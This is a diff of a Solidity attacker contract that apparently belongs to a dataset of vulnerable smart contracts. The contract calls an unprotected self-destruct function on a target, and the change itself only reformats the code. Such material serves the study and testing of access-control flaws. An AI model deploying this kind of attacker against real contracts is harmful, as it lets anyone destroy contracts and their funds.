@@ -4,7 +4,7 @@ import "../dataset/access_control/simple_suicide.sol";
 contract SimpleSuicideAttacker {
     SimpleSuicide target;
 
-    constructor (address _target) public {
+    constructor(address _target) public {
         target = SimpleSuicide(_target);
     }
 
@@ -12,6 +12,5 @@ contract SimpleSuicideAttacker {
         target.sudicideAnyone();
     }
 
-    function () public payable {
-    }
+    function() public payable {}
 }
